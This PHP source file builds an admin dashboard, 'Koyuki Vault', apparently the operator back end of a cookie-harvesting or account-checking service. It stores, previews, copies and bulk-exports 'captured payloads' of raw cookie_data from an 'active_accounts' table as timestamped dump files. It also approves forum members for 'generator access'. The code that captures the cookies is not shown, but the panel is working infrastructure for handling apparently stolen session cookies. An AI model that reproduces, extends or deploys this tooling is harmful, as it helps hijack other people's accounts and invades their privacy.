<?php
session_start();
date_default_timezone_set('Asia/Manila'); 
require_once '../db.php';

$error_msg = '';
$success_msg = '';

if (isset($pdo)) {
    // Current Dashboard View
    $current_view = $_GET['view'] ?? 'payloads';

    // Handle Admin Logout
    if (isset($_GET['action']) && $_GET['action'] === 'logout') {
        session_destroy();
        header("Location: admin.php");
        exit;
    }

    // Handle User Management Logic
    if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
        
        // Toggle Registration Lock
        if (isset($_GET['action']) && $_GET['action'] === 'toggle_registration') {
            $stmt = $pdo->query("SELECT setting_value FROM system_settings WHERE setting_key = 'registration_locked'");
            $current = $stmt->fetchColumn();
            $new_val = ($current === 'true') ? 'false' : 'true';
            
            $update = $pdo->prepare("UPDATE system_settings SET setting_value = ? WHERE setting_key = 'registration_locked'");
            $update->execute([$new_val]);
            header("Location: admin.php?view=users");
            exit;
        }

        // Change User Status
        if (isset($_GET['action']) && in_array($_GET['action'], ['approve_user', 'reject_user', 'delete_user']) && isset($_GET['id'])) {
            $id = (int)$_GET['id'];
            if ($_GET['action'] === 'approve_user') {
                $stmt = $pdo->prepare("UPDATE users SET status = 'approved' WHERE id = ?");
                $stmt->execute([$id]);
            } elseif ($_GET['action'] === 'reject_user') {
                $stmt = $pdo->prepare("UPDATE users SET status = 'rejected' WHERE id = ?");
                $stmt->execute([$id]);
            } elseif ($_GET['action'] === 'delete_user') {
                $stmt = $pdo->prepare("DELETE FROM users WHERE id = ?");
                $stmt->execute([$id]);
            }
            header("Location: admin.php?view=users");
            exit;
        }
    }

    // Handle Payload Download
    if (isset($_GET['action']) && $_GET['action'] === 'download') {
        if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
            try {
                $stmt = $pdo->query("SELECT cookie_data FROM active_accounts ORDER BY date_checked DESC");
                $cookies = $stmt->fetchAll(PDO::FETCH_COLUMN);
                if (ob_get_length()) ob_clean();
                header('Content-Type: text/plain; charset=utf-8');
                header('Content-Disposition: attachment; filename="koyuki_database_dump_' . date('Y-m-d_h-i-A') . '_PHT.txt"');
                $formatted_cookies = [];
                foreach ($cookies as $cookie) {
                    $formatted_cookies[] = trim($cookie);
                }
                echo implode("\r\n\r\n=====================\r\n\r\n", $formatted_cookies);
                exit; 
            } catch (\PDOException $e) {
                $error_msg = "SYS_ERR_DOWNLOAD: " . $e->getMessage();
            }
        }
    }

    // Handle Payload Delete Single
    if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['id'])) {
        if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
            try {
                $del_stmt = $pdo->prepare("DELETE FROM active_accounts WHERE id = ?");
                $del_stmt->execute([$_GET['id']]);
                $ret_page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
                header("Location: admin.php?view=payloads&page=" . $ret_page);
                exit;
            } catch (\PDOException $e) {
                $error_msg = "SYS_ERR_DELETE: " . $e->getMessage();
            }
        }
    }

    // Handle Payload Delete ALL
    if (isset($_GET['action']) && $_GET['action'] === 'delete_all') {
        if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
            try {
                $pdo->exec("DELETE FROM active_accounts");
                header("Location: admin.php?view=payloads");
                exit;
            } catch (\PDOException $e) {
                $error_msg = "SYS_ERR_PURGE: " . $e->getMessage();
            }
        }
    }

    // Handle Admin Login
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        if (!empty($username) && !empty($password)) {
            $stmt = $pdo->prepare("SELECT * FROM admins WHERE username = ?");
            $stmt->execute([$username]);
            $admin_user = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($admin_user && password_verify($password, $admin_user['password_hash'])) {
                
                // SECURITY FIX: Prevent Session Fixation for Administrators
                session_regenerate_id(true);
                
                $_SESSION['admin_logged_in'] = true;
                $_SESSION['admin_username'] = $admin_user['username'];
                header("Location: admin.php");
                exit;
            } else {
                $error_msg = "AUTH_DENIED: Invalid Credentials.";
            }
        } else {
            $error_msg = "AUTH_DENIED: Incomplete payload.";
        }
    }
} else {
    $error_msg = "SYS_ERR: Database connection (\$pdo) is missing.";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Koyuki Admin | Data Vault</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Faculty+Glyphic&family=Rye&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00e5ff;       
            --secondary: #0055ff;     
            --bg-dark: #020813;       
            --card-bg: rgba(4, 12, 24, 0.65);
            --card-border: rgba(0, 229, 255, 0.25);
            --text-main: #f0f8ff;
            --text-muted: #7fa4c9;
        }
        body { 
            background: radial-gradient(ellipse at 50% 0%, #003366 0%, var(--bg-dark) 70%);
            color: var(--text-main); 
            font-family: 'Faculty Glyphic', sans-serif; 
            min-height: 100vh;
            background-attachment: fixed;
        }
        .rye-font { font-family: 'Rye', serif; font-weight: normal; }
        .premium-card { 
            background: var(--card-bg); 
            border: 1px solid var(--card-border); 
            border-radius: 24px; 
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
        }
        .glow-text {
            background: linear-gradient(to right, #00e5ff, #8ab4f8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 229, 255, 0.4);
        }
        .form-input {
            background: rgba(2, 8, 20, 0.6); 
            border: 1px solid rgba(0, 229, 255, 0.2); 
            color: #e2e8f0; 
            border-radius: 12px; 
            padding: 14px 20px;
            width: 100%;
            font-size: 14px;
            font-family: 'Faculty Glyphic', sans-serif;
            transition: all 0.3s ease;
        }
        .form-input:focus { background: rgba(2, 8, 20, 0.9); border-color: var(--primary); color: #fff; box-shadow: 0 0 20px rgba(0, 229, 255, 0.2); outline: none; }
        .btn-premium { 
            background: linear-gradient(135deg, var(--secondary), var(--primary)); 
            border: none; border-radius: 12px; padding: 14px; font-weight: 700; letter-spacing: 1px; color: white;
            box-shadow: 0 10px 25px -5px rgba(0, 229, 255, 0.3); transition: all 0.3s ease; text-transform: uppercase; width: 100%; cursor: pointer;
        }
        .btn-premium:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(0, 229, 255, 0.5); }
        .action-btn {
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.3); color: var(--primary);
            border-radius: 8px; transition: all 0.2s; font-size: 12px; font-weight: 600; padding: 6px 12px; cursor: pointer;
        }
        .action-btn:hover { background: var(--primary); color: var(--bg-dark); box-shadow: 0 0 10px rgba(0, 229, 255, 0.4); }
        .action-btn-danger { border-color: rgba(248, 113, 113, 0.4); color: #f87171; }
        .action-btn-danger:hover { background: #f87171; color: var(--bg-dark); box-shadow: 0 0 10px rgba(248, 113, 113, 0.4); }
        
        .nav-tab { color: var(--text-muted); border-bottom: 2px solid transparent; padding-bottom: 1.5rem; transition: all 0.3s; }
        .nav-tab:hover { color: var(--primary); }
        .nav-tab.active { color: var(--primary); border-bottom-color: var(--primary); text-shadow: 0 0 10px rgba(0, 229, 255, 0.4); }

        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg-dark); }
        ::-webkit-scrollbar-thumb { background: rgba(0, 229, 255, 0.3); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--primary); }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen relative">

<div class="fixed top-0 right-0 w-96 h-96 bg-cyan-400/10 rounded-full blur-[100px] pointer-events-none -z-10"></div>
<div class="fixed bottom-0 left-0 w-96 h-96 bg-blue-600/10 rounded-full blur-[100px] pointer-events-none -z-10"></div>

<?php if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true): ?>
    <!-- LOGIN PORTAL -->
    <div class="premium-card p-8 w-full max-w-md mx-4 relative overflow-hidden">
        <div class="text-center mb-8 relative z-10">
            <div class="inline-block p-2 rounded-full bg-[#040c18] border border-[rgba(0,229,255,0.3)] mb-4 shadow-[0_0_15px_rgba(0,229,255,0.2)]">
                <img src="../logo.png" alt="Koyuki Logo" class="h-24 w-24 object-cover rounded-full border border-[#00e5ff]/20" onerror="this.onerror=null; this.src='https://via.placeholder.com/96/00e5ff/ffffff?text=K';">
            </div>
            <h2 class="text-3xl rye-font glow-text">Koyuki Secure Auth</h2>
            <p class="text-[#7fa4c9] text-sm mt-2">Enter credentials to access databank</p>
        </div>

        <?php if ($error_msg): ?>
            <div class="border border-red-500/50 text-red-400 bg-red-900/20 p-3 rounded-xl text-sm mb-6 flex items-center shadow-[0_0_10px_rgba(239,68,68,0.2)] relative z-10">
                <i class="fas fa-exclamation-circle mr-3"></i> <?php echo htmlspecialchars($error_msg); ?>
            </div>
        <?php endif; ?>

        <form method="POST" action="" class="relative z-10">
            <div class="mb-5">
                <label class="block text-xs font-bold text-[#7fa4c9] uppercase tracking-wider mb-2">Username</label>
                <input type="text" name="username" class="form-input" required placeholder="Administrator ID">
            </div>
            <div class="mb-8">
                <label class="block text-xs font-bold text-[#7fa4c9] uppercase tracking-wider mb-2">Password</label>
                <input type="password" name="password" class="form-input" required placeholder="••••••••">
            </div>
            <button type="submit" name="login" class="btn-premium">
                <i class="fas fa-unlock-alt mr-2"></i> Authenticate
            </button>
        </form>
    </div>

<?php else: ?>
    <!-- NAVIGATION BAR -->
    <nav class="fixed top-0 left-0 w-full z-50 bg-[#020613]/90 backdrop-blur-md border-b border-[rgba(0,229,255,0.2)] shadow-[0_4px_30px_rgba(0,0,0,0.5)]">
        <div class="max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-between h-20">
                <div class="flex items-center gap-3">
                    <img src="../logo.png" alt="Logo" class="h-10 w-10 object-cover rounded-lg border border-[#00e5ff]/40 shadow-[0_0_15px_rgba(0,229,255,0.4)]" onerror="this.onerror=null; this.src='https://via.placeholder.com/40/00e5ff/ffffff?text=K';">
                    <h1 class="text-2xl rye-font glow-text mt-1 hidden sm:block">Koyuki Vault</h1>
                </div>
                
                <div class="hidden sm:flex items-center gap-6 h-full pt-6">
                    <a href="?view=payloads" class="nav-tab font-bold tracking-wider text-sm uppercase <?php echo $current_view === 'payloads' ? 'active' : ''; ?>">
                        <i class="fas fa-database mr-1"></i> Payloads
                    </a>
                    <a href="?view=users" class="nav-tab font-bold tracking-wider text-sm uppercase <?php echo $current_view === 'users' ? 'active' : ''; ?>">
                        <i class="fas fa-users mr-1"></i> User Management
                    </a>
                </div>

                <div class="flex items-center gap-4">
                    <span class="text-sm font-medium text-slate-300 hidden md:block">
                        Logged in as <strong class="text-[#00e5ff]"><?php echo htmlspecialchars($_SESSION['admin_username']); ?></strong>
                    </span>
                    <a href="?action=logout" class="bg-[rgba(248,113,113,0.1)] border border-[rgba(248,113,113,0.3)] text-red-400 hover:bg-red-500 hover:text-white px-4 py-2 rounded-xl text-sm font-semibold transition-all shadow-[0_0_10px_rgba(248,113,113,0.1)] hover:shadow-[0_0_15px_rgba(248,113,113,0.4)]">
                        <i class="fas fa-sign-out-alt mr-2"></i> Disconnect
                    </a>
                </div>
            </div>
            
            <!-- Mobile Menu Dropdown -->
            <div class="sm:hidden flex justify-center gap-6 pb-3 border-t border-[rgba(0,229,255,0.1)] pt-3">
                <a href="?view=payloads" class="text-sm uppercase font-bold tracking-widest <?php echo $current_view === 'payloads' ? 'text-[#00e5ff]' : 'text-slate-400'; ?>"><i class="fas fa-database mr-1"></i> Payloads</a>
                <a href="?view=users" class="text-sm uppercase font-bold tracking-widest <?php echo $current_view === 'users' ? 'text-[#00e5ff]' : 'text-slate-400'; ?>"><i class="fas fa-users mr-1"></i> Users</a>
            </div>
        </div>
    </nav>

    <!-- MAIN DASHBOARD CONTENT -->
    <div class="w-full max-w-[1200px] px-4 mt-32 mb-10 flex-grow">
        
        <?php if ($error_msg): ?>
            <div class="border border-red-500/50 text-red-400 bg-red-900/20 p-4 rounded-xl text-sm mb-6 shadow-[0_0_10px_rgba(239,68,68,0.2)]"><i class="fas fa-exclamation-triangle mr-2"></i> <?php echo htmlspecialchars($error_msg); ?></div>
        <?php endif; ?>

        <?php if ($current_view === 'payloads'): ?>
            <!-- VIEW: PAYLOADS -->
            <div class="flex flex-col md:flex-row justify-between items-start md:items-end mb-6 gap-4">
                <div>
                    <h2 class="text-3xl rye-font text-white tracking-wide">Captured Payloads</h2>
                    <p class="text-[#7fa4c9] text-sm mt-2"><i class="fas fa-server mr-2 text-[#00e5ff]"></i> Secure storage overview</p>
                </div>
                <div class="flex flex-wrap gap-3 w-full md:w-auto">
                    <button onclick="confirmDeleteAll()" class="flex-1 md:flex-none text-center bg-[rgba(248,113,113,0.05)] hover:bg-red-500 border border-[rgba(248,113,113,0.3)] text-red-400 hover:text-white px-5 py-2.5 rounded-xl text-sm font-bold transition-all shadow-[0_0_10px_rgba(248,113,113,0.1)]">
                        <i class="fas fa-trash-alt mr-2"></i> Purge Database
                    </button>
                    <a href="?action=download" class="flex-1 md:flex-none text-center bg-[rgba(0,229,255,0.05)] hover:bg-[#00e5ff] border border-[rgba(0,229,255,0.4)] text-[#00e5ff] hover:text-[#020813] px-5 py-2.5 rounded-xl text-sm font-bold transition-all shadow-[0_0_10px_rgba(0,229,255,0.15)]">
                        <i class="fas fa-download mr-2"></i> Export Dump
                    </a>
                </div>
            </div>

            <!-- DATA TABLE -->
            <div class="premium-card overflow-hidden">
                <div class="overflow-x-auto">
                    <table class="w-full text-left whitespace-nowrap">
                        <thead class="bg-[#020613]/80 border-b border-[rgba(0,229,255,0.2)]">
                            <tr>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest w-24">ID</th>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest w-48">Logged Date (PHT)</th>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest">Raw Data Preview</th>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest text-center w-32">Actions</th>
                            </tr>
                        </thead>
                        <tbody class="divide-y divide-[rgba(0,229,255,0.1)]">
                            <?php
                            try {
                                $limit = 15;
                                $page = isset($_GET['page']) && is_numeric($_GET['page']) ? (int)$_GET['page'] : 1;
                                if ($page < 1) $page = 1;
                                $offset = ($page - 1) * $limit;

                                $count_stmt = $pdo->query("SELECT COUNT(*) FROM active_accounts");
                                $total_records = $count_stmt->fetchColumn();
                                $total_pages = ceil($total_records / $limit);
                                if ($total_pages == 0) $total_pages = 1;

                                $stmt = $pdo->prepare("SELECT * FROM active_accounts ORDER BY date_checked DESC LIMIT :limit OFFSET :offset");
                                $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
                                $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
                                $stmt->execute();
                                
                                $accounts = $stmt->fetchAll(PDO::FETCH_ASSOC);

                                if (count($accounts) > 0) {
                                    foreach ($accounts as $row) {
                                        $date = new DateTime($row['date_checked'], new DateTimeZone('UTC'));
                                        $date->setTimezone(new DateTimeZone('Asia/Manila'));
                                        $formatted_date = $date->format('M d, Y • h:i A');
                                        
                                        $formatted_id = sprintf('%05d', $row['id']);
                                        $cookie_preview = htmlspecialchars(substr($row['cookie_data'], 0, 70)) . '...';
                                        
                                        // SECURITY FIX: Stored XSS Prevention. Properly encode quotes in the tooltip so HTML isn't broken
                                        $full_cookie = htmlspecialchars($row['cookie_data'], ENT_QUOTES, 'UTF-8');
                                        
                                        echo "<tr class='hover:bg-[rgba(0,229,255,0.03)] transition-colors duration-200'>";
                                        echo "<td class='px-6 py-4'><span class='bg-[rgba(0,229,255,0.1)] text-[#00e5ff] border border-[rgba(0,229,255,0.3)] px-2 py-1 rounded text-xs font-mono font-bold'>#" . $formatted_id . "</span></td>";
                                        echo "<td class='px-6 py-4 text-sm text-slate-300 font-medium'><i class='far fa-clock mr-2 text-[#7fa4c9] opacity-70'></i>" . $formatted_date . "</td>";
                                        echo "<td class='px-6 py-4 text-xs font-mono text-emerald-300/80 cursor-help' title='" . $full_cookie . "'>" . $cookie_preview . "</td>";
                                        echo "<td class='px-6 py-4 text-center'>
                                                <div class='flex justify-center gap-2'>
                                                    <button onclick='copyToClipboard(`" . base64_encode($row['cookie_data']) . "`)' class='action-btn' title='Copy Data'><i class='fas fa-copy'></i></button>
                                                    <button onclick='confirmDelete(" . $row['id'] . ", " . $page . ")' class='action-btn action-btn-danger' title='Delete Record'><i class='fas fa-trash'></i></button>
                                                </div>
                                              </td>";
                                        echo "</tr>";
                                    }
                                } else {
                                    echo "<tr><td colspan='4' class='px-6 py-12 text-center text-[#7fa4c9]'><i class='fas fa-folder-open text-3xl mb-3 opacity-50 block'></i>No records found in the databank.</td></tr>";
                                }
                            } catch (\PDOException $e) {
                                echo "<tr><td colspan='4' class='px-6 py-8 text-center text-red-500'>SYS_ERR: " . $e->getMessage() . "</td></tr>";
                            }
                            ?>
                        </tbody>
                    </table>
                </div>

                <!-- PAGINATION -->
                <?php if (isset($total_pages) && $total_pages > 1): ?>
                <div class="px-6 py-5 border-t border-[rgba(0,229,255,0.2)] flex flex-col sm:flex-row justify-between items-center bg-[#020613]/50 gap-4">
                    <span class="text-sm font-medium text-[#7fa4c9]">
                        Showing <strong class="text-[#00e5ff]"><?php echo $offset + 1; ?></strong> to <strong class="text-[#00e5ff]"><?php echo min($offset + $limit, $total_records); ?></strong> of <strong class="text-[#00e5ff]"><?php echo $total_records; ?></strong> entries
                    </span>
                    <div class="flex gap-1">
                        <?php if ($page > 1): ?>
                            <a href="?view=payloads&page=<?php echo $page - 1; ?>" class="px-3 py-1.5 rounded-lg border border-[rgba(0,229,255,0.3)] text-[#00e5ff] hover:bg-[#00e5ff] hover:text-[#020813] transition-all"><i class="fas fa-chevron-left text-xs"></i></a>
                        <?php endif; ?>
                        
                        <?php 
                        $start_page = max(1, $page - 2);
                        $end_page = min($total_pages, $page + 2);
                        for ($i = $start_page; $i <= $end_page; $i++): 
                        ?>
                            <a href="?view=payloads&page=<?php echo $i; ?>" class="px-3 py-1.5 rounded-lg border <?php echo $i == $page ? 'bg-[#00e5ff] text-[#020813] border-[#00e5ff] font-bold' : 'border-[rgba(0,229,255,0.3)] text-[#00e5ff] hover:bg-[#00e5ff] hover:text-[#020813]'; ?> transition-all"><?php echo $i; ?></a>
                        <?php endfor; ?>

                        <?php if ($page < $total_pages): ?>
                            <a href="?view=payloads&page=<?php echo $page + 1; ?>" class="px-3 py-1.5 rounded-lg border border-[rgba(0,229,255,0.3)] text-[#00e5ff] hover:bg-[#00e5ff] hover:text-[#020813] transition-all"><i class="fas fa-chevron-right text-xs"></i></a>
                        <?php endif; ?>
                    </div>
                </div>
                <?php endif; ?>
            </div>
            
        <?php elseif ($current_view === 'users'): ?>
            <!-- VIEW: USER MANAGEMENT -->
            <?php
                $stmt = $pdo->query("SELECT setting_value FROM system_settings WHERE setting_key = 'registration_locked'");
                $reg_locked = ($stmt->fetchColumn() === 'true');
            ?>
            <div class="flex flex-col md:flex-row justify-between items-start md:items-end mb-6 gap-4">
                <div>
                    <h2 class="text-3xl rye-font text-white tracking-wide">User Management</h2>
                    <p class="text-[#7fa4c9] text-sm mt-2"><i class="fas fa-users-cog mr-2 text-[#00e5ff]"></i> Authorize generator access for members</p>
                </div>
                <div class="flex w-full md:w-auto">
                    <a href="?action=toggle_registration" class="w-full text-center py-2.5 px-6 rounded-xl border font-bold uppercase tracking-wider text-sm transition-all shadow-[0_0_15px_rgba(0,0,0,0.5)] <?php echo $reg_locked ? 'bg-red-500/10 border-red-500/50 text-red-400 hover:bg-red-500 hover:text-white' : 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400 hover:bg-emerald-500 hover:text-white'; ?>">
                        <?php if($reg_locked): ?>
                            <i class="fas fa-lock mr-2"></i> Sign-ups Locked (Click to Open)
                        <?php else: ?>
                            <i class="fas fa-lock-open mr-2"></i> Sign-ups Open (Click to Lock)
                        <?php endif; ?>
                    </a>
                </div>
            </div>

            <!-- USERS TABLE -->
            <div class="premium-card overflow-hidden">
                <div class="overflow-x-auto">
                    <table class="w-full text-left whitespace-nowrap">
                        <thead class="bg-[#020613]/80 border-b border-[rgba(0,229,255,0.2)]">
                            <tr>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest w-16">ID</th>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest">Username</th>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest">Email</th>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest">Forum</th>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest text-center w-32">Status</th>
                                <th class="px-6 py-5 text-xs font-bold text-[#7fa4c9] uppercase tracking-widest text-center w-32">Actions</th>
                            </tr>
                        </thead>
                        <tbody class="divide-y divide-[rgba(0,229,255,0.1)]">
                            <?php
                            try {
                                $stmt = $pdo->query("SELECT * FROM users ORDER BY created_at DESC");
                                $users = $stmt->fetchAll(PDO::FETCH_ASSOC);

                                if (count($users) > 0) {
                                    foreach ($users as $user) {
                                        $user_status = $user['status'] ?? 'pending';
                                        $statusBadge = '';
                                        if ($user_status == 'approved') {
                                            $statusBadge = '<span class="text-emerald-400 bg-emerald-400/10 border border-emerald-400/30 px-3 py-1 rounded-full text-[10px] uppercase font-bold tracking-wider"><i class="fas fa-check-circle mr-1"></i> Approved</span>';
                                        } elseif ($user_status == 'rejected') {
                                            $statusBadge = '<span class="text-red-400 bg-red-400/10 border border-red-400/30 px-3 py-1 rounded-full text-[10px] uppercase font-bold tracking-wider"><i class="fas fa-times-circle mr-1"></i> Rejected</span>';
                                        } else {
                                            $statusBadge = '<span class="text-amber-400 bg-amber-400/10 border border-amber-400/30 px-3 py-1 rounded-full text-[10px] uppercase font-bold tracking-wider"><i class="fas fa-clock mr-1"></i> Pending</span>';
                                        }

                                        echo "<tr class='hover:bg-[rgba(0,229,255,0.03)] transition-colors duration-200'>";
                                        echo "<td class='px-6 py-4 text-sm text-[#7fa4c9]'>#" . $user['id'] . "</td>";
                                        echo "<td class='px-6 py-4 text-sm text-white font-bold'>" . htmlspecialchars($user['username']) . "</td>";
                                        echo "<td class='px-6 py-4 text-sm text-slate-300'>" . htmlspecialchars($user['email']) . "</td>";
                                        echo "<td class='px-6 py-4 text-sm text-slate-400'>" . htmlspecialchars($user['forum']) . "</td>";
                                        echo "<td class='px-6 py-4 text-center'>" . $statusBadge . "</td>";
                                        echo "<td class='px-6 py-4 text-center'>
                                                <div class='flex justify-center gap-2'>";
                                        if ($user_status !== 'approved') {
                                            echo "<a href='?action=approve_user&id={$user['id']}' class='action-btn !text-emerald-400 !border-emerald-400/30 hover:!bg-emerald-500 hover:!text-white' title='Approve Access'><i class='fas fa-check'></i></a>";
                                        }
                                        if ($user_status !== 'rejected') {
                                            echo "<a href='?action=reject_user&id={$user['id']}' class='action-btn !text-amber-400 !border-amber-400/30 hover:!bg-amber-500 hover:!text-white' title='Revoke Access'><i class='fas fa-ban'></i></a>";
                                        }
                                        echo "<button onclick='confirmUserDelete({$user['id']})' class='action-btn action-btn-danger' title='Delete User'><i class='fas fa-trash'></i></button>";
                                        echo "</div></td></tr>";
                                    }
                                } else {
                                    echo "<tr><td colspan='6' class='px-6 py-12 text-center text-[#7fa4c9]'><i class='fas fa-users-slash text-3xl mb-3 opacity-50 block'></i>No users have registered yet.</td></tr>";
                                }
                            } catch (\PDOException $e) {
                                echo "<tr><td colspan='6' class='text-center text-red-500 py-4'>SYS_ERR: " . $e->getMessage() . "</td></tr>";
                            }
                            ?>
                        </tbody>
                    </table>
                </div>
            </div>
            
        <?php endif; ?>
    </div>

    <!-- SWEETALERT LOGIC -->
    <script>
        const swalIce = Swal.mixin({
            background: '#020813',
            color: '#f0f8ff',
            customClass: {
                popup: 'border border-[rgba(0,229,255,0.3)] rounded-2xl shadow-[0_0_30px_rgba(0,229,255,0.15)]',
                title: 'font-["Rye"] text-2xl text-[#00e5ff]',
                confirmButton: 'bg-gradient-to-r from-[#0055ff] to-[#00e5ff] text-white px-6 py-2.5 rounded-xl ml-2 font-bold uppercase tracking-wider hover:shadow-[0_0_15px_rgba(0,229,255,0.5)] transition-all',
                cancelButton: 'bg-transparent border border-[#7fa4c9] text-[#7fa4c9] hover:bg-[rgba(127,164,201,0.1)] hover:text-white px-6 py-2.5 rounded-xl mr-2 font-bold uppercase tracking-wider transition-all'
            },
            buttonsStyling: false
        });

        function confirmDelete(id, page) {
            swalIce.fire({
                title: 'Delete Record?',
                text: "This action cannot be undone.",
                icon: 'warning',
                iconColor: '#f87171',
                showCancelButton: true,
                confirmButtonText: 'Yes, Delete',
                cancelButtonText: 'Cancel'
            }).then((result) => {
                if (result.isConfirmed) {
                    window.location.href = `?action=delete&id=${id}&page=${page}`;
                }
            });
        }

        function confirmUserDelete(id) {
            swalIce.fire({
                title: 'Delete User?',
                text: "This will permanently remove their account from the system.",
                icon: 'warning',
                iconColor: '#f87171',
                showCancelButton: true,
                confirmButtonText: 'Delete User',
                cancelButtonText: 'Cancel'
            }).then((result) => {
                if (result.isConfirmed) {
                    window.location.href = `?action=delete_user&id=${id}`;
                }
            });
        }

        function confirmDeleteAll() {
            swalIce.fire({
                title: 'Purge Entire Database?',
                text: "All captured payloads will be permanently destroyed.",
                icon: 'error',
                iconColor: '#ef4444',
                showCancelButton: true,
                confirmButtonText: 'Confirm Purge',
                cancelButtonText: 'Abort',
                customClass: {
                    confirmButton: 'bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-2.5 rounded-xl ml-2 font-bold uppercase tracking-wider hover:shadow-[0_0_15px_rgba(239,68,68,0.5)] transition-all',
                    cancelButton: 'bg-transparent border border-[#7fa4c9] text-[#7fa4c9] hover:bg-[rgba(127,164,201,0.1)] hover:text-white px-6 py-2.5 rounded-xl mr-2 font-bold uppercase tracking-wider transition-all',
                    popup: 'border border-[rgba(239,68,68,0.3)] rounded-2xl shadow-[0_0_30px_rgba(239,68,68,0.15)]',
                    title: 'font-["Rye"] text-2xl text-red-400'
                }
            }).then((result) => {
                if (result.isConfirmed) {
                    window.location.href = '?action=delete_all';
                }
            });
        }

        function copyToClipboard(base64Data) {
            try {
                const text = atob(base64Data);
                const tempTextArea = document.createElement("textarea");
                tempTextArea.value = text;
                document.body.appendChild(tempTextArea);
                tempTextArea.select();
                document.execCommand("copy");
                document.body.removeChild(tempTextArea);
                
                Swal.fire({
                    toast: true,
                    position: 'top-end',
                    icon: 'success',
                    iconColor: '#00e5ff',
                    title: '> PAYLOAD_COPIED',
                    showConfirmButton: false,
                    timer: 2000,
                    background: '#020813',
                    color: '#00e5ff',
                    customClass: { popup: 'border border-[rgba(0,229,255,0.3)]' }
                });
            } catch (e) {
                console.error("Copy failed", e);
            }
        }
    </script>
<?php endif; ?>

</body>
</html>
